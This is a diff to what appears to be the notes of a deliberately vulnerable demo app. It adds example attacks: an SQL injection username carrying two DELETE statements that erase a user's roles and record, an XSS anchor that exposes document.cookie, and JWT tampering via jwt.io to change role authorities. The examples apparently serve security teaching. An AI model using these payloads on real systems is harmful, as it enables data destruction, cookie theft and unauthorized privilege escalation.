@@ -18,3 +18,17 @@ SQL injection
 XSS
 Privileges escalation
 Path traversal
+
+SQL injection example as username in login:
+```
+BOB'; DELETE FROM users_roles r where r.users_id = (SELECT id FROM users u where u.username = 'BOB');DELETE FROM users u where u.username = 'BOB
+```
+
+XSS example as description of book:
+```
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+```
+
+Privileges escalation via jwt token tampering:
+Modify token data via https://jwt.io with proper jwt.secret.key inserted, example change roles via `authorities` in token.
+![img.png](jwt_change.png)
